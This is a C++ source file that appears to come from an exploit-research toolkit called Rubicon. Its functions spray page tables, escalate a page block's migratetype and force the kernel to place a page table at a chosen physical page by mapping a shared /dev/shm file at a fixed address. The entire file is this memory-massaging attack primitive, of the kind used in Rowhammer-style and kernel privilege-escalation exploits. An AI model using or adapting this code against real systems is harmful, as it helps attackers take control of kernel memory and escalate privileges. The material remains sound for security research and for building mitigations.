#include "rubicon.hpp"

#include <cstdio>
#include <fcntl.h>
#include <sys/mman.h>
#include <unistd.h>

int pt_spray_bait_allocator(void* ctx) {
    return pt_spray_tables(*static_cast<pt_spray_args_t*>(ctx));
}

pt_install_ctxt
pt_install(void* page_block, void* pt_target, void* addr) {
    auto pt_ctxt = pt_install_ctxt{};

    const char* buf = "ffffffffffffffff";
    pt_ctxt.fd      = open("/dev/shm", O_TMPFILE | O_RDWR, S_IRUSR | S_IWUSR);
    write(pt_ctxt.fd, buf, 8);
    pt_ctxt.fd_ptr = mmap(NULL, PAGE_SIZE, PROT_READ | PROT_WRITE,
                          MAP_SHARED | MAP_POPULATE, pt_ctxt.fd, 0);
    mlock(pt_ctxt.fd_ptr, PAGE_SIZE);

    void* bait_ptr  = (void*)((unsigned long)page_block + PAGEBLOCK_SIZE / 2);
    auto spray_args = pt_spray_args_t{
        .start = (void*)SPRAY_START,
        .fd = pt_ctxt.fd,
        .nr_tables = NR_PAGE_TABLES_SPRAY,
    };

    migratetype_escalation(bait_ptr, 9, pt_spray_bait_allocator,
                           &spray_args);
    pt_unspray_tables(spray_args);

    // Move the target as next candidate for page table allocation
    munlock(pt_target, PAGE_SIZE);
    block_merge(pt_target, 0);
    // Install the page table at the target.
    mmap(addr, PAGE_SIZE,
         PROT_READ | PROT_WRITE,
         MAP_FIXED | MAP_SHARED | MAP_POPULATE,
         pt_ctxt.fd,
         0);

    return pt_ctxt;
}

void pt_deallocate(const pt_install_ctxt& pt_ctxt) {
    close(pt_ctxt.fd);
    munlock(pt_ctxt.fd_ptr, PAGE_SIZE);
    munmap(pt_ctxt.fd_ptr, PAGE_SIZE);
}